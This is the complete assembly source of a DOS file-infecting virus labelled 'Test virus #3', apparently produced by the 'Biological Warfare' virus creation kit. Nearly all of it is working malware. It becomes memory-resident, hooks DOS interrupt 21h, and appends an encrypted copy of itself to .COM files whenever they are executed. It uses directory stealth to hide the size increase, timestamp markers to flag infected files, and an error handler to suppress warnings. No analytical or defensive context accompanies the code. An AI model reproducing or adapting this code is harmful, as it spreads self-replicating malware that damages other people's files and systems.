; test3.asm : Test virus #3
; Created with Biological Warfare - Version 0.90á by MnemoniX

PING            equ     0FA10h
PONG            equ     0B8D4h
STAMP           equ     31

code            segment
                org     0
                assume  cs:code,ds:code

start:
                db      0E9h,3,0          ; to virus
host:
                db      0CDh,20h,0        ; host program
virus_begin:

                db      0BBh                    ; decryption module
code_offset     dw      offset virus_code
                mov     si,VIRUS_SIZE / 2 + 1
                db      0B8h
cipher          dw      0

decrypt:
                xor     cs:[bx],ax
                add     bx,2
                dec     si
                jnz     decrypt


virus_code:
                push    ds es

                call    $ + 3             ; BP is instruction ptr.
                pop     bp
                sub     bp,offset $ - 1

                mov     ax,PING           ; test for residency
                int     21h
                cmp     dx,PONG
                je      installed

                mov     ax,es                   ; Get PSP
                dec     ax
                mov     ds,ax                   ; Get MCB

                sub     word ptr ds:[3],((MEM_SIZE+1023) / 1024) * 64
                sub     word ptr ds:[12h],((MEM_SIZE+1023) / 1024) * 64
                mov     es,word ptr ds:[12h]

                push    cs                      ; copy virus into memory
                pop     ds
                xor     di,di
                mov     si,bp
                mov     cx,(virus_end - start) / 2 + 1
                rep     movsw

                xor     ax,ax                   ; capture interrupts
                mov     ds,ax

                mov     si,21h * 4              ; get original int 21
                mov     di,offset old_int_21
                movsw
                movsw

                mov     word ptr ds:[si - 4],offset new_int_21
                mov     ds:[si - 2],es          ; and set new int 21

installed:
                pop     es ds                   ; restore segregs
com_exit:
                lea     si,[bp + host]          ; restore host program
                mov     di,100h
                push    di
                movsw
                movsb

                call    fix_regs                ; fix up registers
                ret                             ; and leave

fix_regs:
                xor     ax,ax
                cwd
                xor     bx,bx
                mov     si,100h
                xor     di,di
                xor     bp,bp
                ret

; interrupt 21 handler
int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,PING                 ; residency test
                je      ping_pong
                cmp     ah,11h                  ; directory stealth
                je      dir_stealth
                cmp     ah,12h
                je      dir_stealth
                cmp     ah,4Eh                  ; directory stealth
                je      dir_stealth_2
                cmp     ah,4Fh
                je      dir_stealth_2
                cmp     ax,4B00h                ; execute program
                jne     int_21_exit
                jmp     execute
int_21_exit:
                db      0EAh                    ; never mind ...
old_int_21      dd      0

ping_pong:
                mov     dx,PONG
                iret

dir_stealth:
                call    int_21                  ; get dir entry
                test    al,al
                js      dir_stealth_done

                push    ax bx es
                mov     ah,2Fh
                int     21h

                cmp     byte ptr es:[bx],-1     ; check for extended FCB
                jne     no_ext_FCB
                add     bx,7
no_ext_FCB:
                mov     ax,es:[bx + 17h]        ; check for infection marker
                and     al,31
                cmp     al,STAMP
                jne     dir_fixed

                sub     word ptr es:[bx + 1Dh],VIRUS_SIZE + 3
                sbb     word ptr es:[bx + 1Fh],0
dir_fixed:
                pop     es bx ax
dir_stealth_done:
                iret

dir_stealth_2:
                pushf
                call    dword ptr cs:[old_int_21]
                jc      dir_stealth_done_2

check_infect2:
                push    ax bx es

                mov     ah,2Fh
                int     21h
                mov     ax,es:[bx + 16h]
                and     al,31                   ; check timestamp
                cmp     al,STAMP
                jne     fixed_2

                sub     es:[bx + 1Ah],VIRUS_SIZE + 3
                sbb     word ptr es:[bx + 1Ch],0

fixed_2:
                pop     es bx ax
                clc                             ; clear carry
dir_stealth_done_2:
                retf    2
execute:
                push    ax bx cx dx si di ds es

                xor     ax,ax                   ; critical error handler
                mov     es,ax                   ; routine - catch int 24
                mov     es:[24h * 4],offset int_24
                mov     es:[24h * 4 + 2],cs

                mov     ax,4300h                ; change attributes
                int     21h

                push    cx dx ds
                xor     cx,cx
                call    set_attributes

                mov     ax,3D02h                ; open file
                int     21h
                jc      cant_open
                xchg    bx,ax

                push    cs                      ; CS = DS
                pop     ds

                mov     ax,5700h                ; save file date/time
                int     21h
                push    cx dx
                mov     ah,3Fh
                mov     cx,28
                mov     dx,offset read_buffer
                int     21h

                cmp     word ptr read_buffer,'ZM' ; .EXE?
                je      dont_infect             ; .EXE, skip

                mov     al,2                    ; move to end of file
                call    move_file_ptr

                cmp     dx,65279 - (VIRUS_SIZE + 3)
                ja      dont_infect             ; too big, don't infect

                sub     dx,VIRUS_SIZE + 3       ; check for previous infection
                cmp     dx,word ptr read_buffer + 1
                je      dont_infect

                add     dx,VIRUS_SIZE + 3
                mov     word ptr new_jump + 1,dx

                add     dx,103h
                call    encrypt_code            ; encrypt virus

                mov     dx,offset read_buffer   ; save original program head
                int     21h

                mov     ah,40h                  ; write virus to file
                mov     cx,VIRUS_SIZE
                mov     dx,offset encrypt_buffer
                int     21h

                xor     al,al                   ; back to beginning of file
                call    move_file_ptr

                mov     dx,offset new_jump      ; and write new jump
                int     21h

fix_date_time:
                pop     dx cx
                and     cl,-32                  ; add time stamp
                or      cl,STAMP
                mov     ax,5701h                ; restore file date/time
                int     21h

close:
                pop     ds dx cx                ; restore attributes
                call    set_attributes

                mov     ah,3Eh                  ; close file
                int     21h

cant_open:
                pop     es ds di si dx cx bx ax
                jmp     int_21_exit             ; leave


set_attributes:
                mov     ax,4301h
                int     21h
                ret

dont_infect:
                pop     cx dx                   ; can't infect, skip
                jmp     close

move_file_ptr:
                mov     ah,42h                  ; move file pointer
                cwd
                xor     cx,cx
                int     21h

                mov     dx,ax                   ; set up registers
                mov     ah,40h
                mov     cx,3
                ret

courtesy_of     db      '[BW]',0
signature       db      'Test virus #3',0


encrypt_code:
                push    ax cx

                push    dx
                xor     ah,ah                   ; get time for random number
                int     1Ah

                mov     cipher,dx               ; save encryption key
                pop     cx
                add     cx,virus_code - virus_begin
                mov     code_offset,cx          ; save code offset

                push    cs                      ; ES = CS
                pop     es

                mov     si,offset virus_begin   ; move decryption module
                mov     di,offset encrypt_buffer
                mov     cx,virus_code - virus_begin
                rep     movsb

                mov     cx,VIRUS_SIZE / 2 + 1
encrypt:
                lodsw                           ; encrypt virus code
                xor     ax,dx
                stosw
                loop    encrypt

                pop     cx ax
                ret

int_24:
                mov     al,3                    ; int 24 handler
                iret
new_jump        db      0E9h,0,0

virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin
read_buffer     db      28 dup (?)              ; read buffer
encrypt_buffer  db      VIRUS_SIZE dup (?)      ; encryption buffer

end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
                end     start
